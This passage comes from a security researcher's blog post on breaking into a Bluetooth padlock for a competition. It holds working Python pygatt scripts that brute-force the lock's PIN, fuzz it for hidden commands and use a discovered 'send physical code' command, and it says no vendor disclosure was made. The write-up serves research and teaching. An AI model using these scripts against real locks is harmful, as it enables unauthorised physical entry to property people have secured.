0: return if temp_code[i2] &amp;gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) # 60 f0 00 95 if &quot;60f00095&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition. Hidden Command At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with something if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following: 0xXX - beginning byte |__0xYY 0xYY 0xYY 0xYY - some data |__0xZZ - end byte For example, sending the real OPEN command 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD would result in the lock responding with some bytes, but sending a different payload, such as 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE would result in the lock not sending any data back. Additionally, the middle data must be the correct length. For example, sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD is a valid command, but sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD is not a valid command. The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like: 1 byte at the beginning Anywhere between 1 and 18 bytes for the middle data 1 byte at the end So lets make a script which will attempt to find additional commands within the above parameters: import pygatt from binascii import hexlify import sys import math from concurrent import futures import random import time adapter = pygatt.backends.GATTToolBackend(&apos;hci0&apos;) def handle_data(handle, value): response = hexlify(value) print(&quot;Received repsonse (%s)&quot; % str(response)) def decimal_to_hexadecimal(dec): decimal = int(dec) return hex(decimal) def fuzz_function(payload1, payload2, paddingCounter): #create temp code temp_code_length = paddingCounter + 2 temp_code_array = bytearray(temp_code_length) #create byte array payload temp_code_array[0] = payload1 temp_code_array[temp_code_length - 1] = payload2 #temp_code_array[temp_code_length] print(&quot;Payload1: %s, PaddingCounter: %s, Payload2: %s&quot; % (payload1, paddingCounter, payload2)) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, temp_code_array) adapter.start() device = adapter.connect(&apos;28:EC:9A:09:C7:2B&apos;) device.subscribe(&quot;0000ffd4-0000-1000-8000-00805f9b34fb&quot;,callback=handle_data, wait_for_response=False) device.subscribe(&quot;0000ffdf-0000-1000-8000-00805f9b34fb&quot;, indication=False, wait_for_response=True) payload1 = 0 paddingCounter = 1 # modify payload 2 payload2 = 0 while payload2 != 256: while paddingCounter != 19: fuzz_function(payload1, payload2, paddingCounter) paddingCounter = paddingCounter + 1 paddingCounter = 1 payload2 = payload2 + 1 adapter.stop() This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect. Thankfully some hidden commands were found: 0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C 0xEF 0xXX 0xXX 0xXX 0xXX 0xF1 0xFD 0xXX 0xXX 0xXX 0xXX 0xFC I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition: def guess_physical_method(i): physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to &quot;send physical code&quot; if len(str(i)) &amp;lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &amp;gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) if &quot;e0f0000e&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) The Competition After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me: Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me: Disclosure and Files There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working. Files for this research are here: https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/</summary></entry></feed>